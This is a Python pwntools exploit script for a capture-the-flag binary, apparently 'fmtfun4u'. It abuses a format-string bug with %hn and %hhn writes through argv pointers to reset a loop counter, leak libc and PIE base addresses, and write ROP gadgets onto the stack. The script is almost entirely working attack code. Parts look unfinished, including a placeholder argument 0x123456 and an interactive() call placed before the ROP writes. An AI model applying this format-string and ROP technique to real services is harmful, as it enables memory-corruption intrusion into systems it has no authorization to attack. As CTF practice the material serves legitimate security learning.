# -*- coding: utf-8 -*- 
from pwn import *


#file decripter
#0  Standard input  stdin
#1  Standard output stdout
#2  Standard error  stderr

#
#   Arch:     amd64-64-little
#   RELRO:    Full RELRO
#   Stack:    No canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   FORTIFY:  Enabled


buf_off = 0x201020
libc_off = 0x20830      #an address which pushed in __libc_start_main, is an addr in libc.
stack_off = 0x206d0     #an address in stack.(main frame)

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10132)

#main stack 往上算第三個是&argv
#0x7fffffffe5f8     -> 0x7fffffffe6c8 : &argv
#0x7fffffffe6c8     -> 0x7fffffffe8d8 : &argv[0] :./fmtfun4u
#0x7fffffffe6c8+0x8 -> 0x7fffffffe8f3 : &argv[1] :fuck

def fmt(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 65536) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hn' 
    return result
def fmt_hhn(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 256) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hhn' 
    return result
def reset_i(pre):
    r.recvuntil(':')
#    r.interactive()
    r.send('argv:%11$p,%37$p')
    r.recvuntil('argv:')
    
    argv,argv0 = r.recvline().strip().split(',')
    argv = int( argv.ljust(8,'\0') ,0)
    argv0 = int( argv0.ljust(8,'\0') ,0)
    print '%s' % hex(argv)
    print '%s' % hex(argv0)

    #prepare to change i at $6x
    i_addr = (argv % 0x10000) - 0xec
    pay = fmt(pre,i_addr,11)
    pre = i_addr
    #pay = '%' + str(i_addr) + 'x%11$hn'
    print 'send ',pay,hex(i_addr)
    r.sendline(pay)

    #change i to 1000
    r.recvuntil(':')
    sleep(0.1)
    #pay = fmt(pre,1000,37)
    #pre = 1000
    pay = '%' + '1000' + 'x%37$hn'
    r.sendline(pay)

    r.recvuntil(':')
    #reset argv[0]
    #clean_pipe()
    #argv0_off = (argv0 % 0x10000)
    change_argv(0)
    clean_pipe()
    #check
    print 'now argv[0] -> ',hex(get_argv())
    return argv0,pre
def get_argv():
     
    r.sendline('buf:%37$p:')
    r.recvuntil('buf:')
    argv = int(r.recvuntil(':')[:-1],0)
    r.recvuntil(':')
    return argv

def leak_libc_base():
    clean_pipe()
    r.send('%9$p')
    r.recvuntil('0x')
    ret_libc = int( r.recv(12).ljust(8,'\0') ,16)
    libc = ret_libc - libc_off
    return libc 
def leak_text_base():
    clean_pipe()
    r.send('%8$p')
    r.recvuntil('0x')
    text_off = 0xa80 
    rbp_libc = int( r.recv(12).ljust(8,'\0') ,16)
    text_base = rbp_libc - text_off
    return text_base 
def write_rop(rop):
    now_off = get_argv() & 0xffff
    off = now_off
    print 'rop ' , hex(rop)
    clean_pipe()
    for i in range(8):
        val = ( rop >> (i*8) ) & 0xff
        pay = fmt_hhn(0,val,37)
        change_argv(off+i)
        r.send(pay)
        r.recvuntil(':')
    change_argv(off+8)
def change_argv(off):
    #change argv[0]
    pay = '%' + str(off) + 'c%11$hn'
    if off == 0:
        pay = '%11$hn'
    r.sendline(pay)
    r.recvuntil(':')
def set():
    change_argv
def clean_pipe():
    sleep(0.1)
    r.recv(timeout = 0.01)
pre = 0
argv0,pre = reset_i(0)


libc = leak_libc_base()
text = leak_text_base()

buf_off = 0x201600
buf_addr = text + buf_off

print 'libc base : %s\ntext base : %s' % (hex(libc),hex(text))

pop_rdi_off = 0x21102
leave_off = 0x9af
pop_rdi_addr = libc + pop_rdi_off
leave_addr = text + leave_off

clean_pipe()
r.interactive()
write_rop(pop_rdi_addr)
write_rop(0x123456)

write_rop(leave_addr)



clean_pipe()
r.interactive()








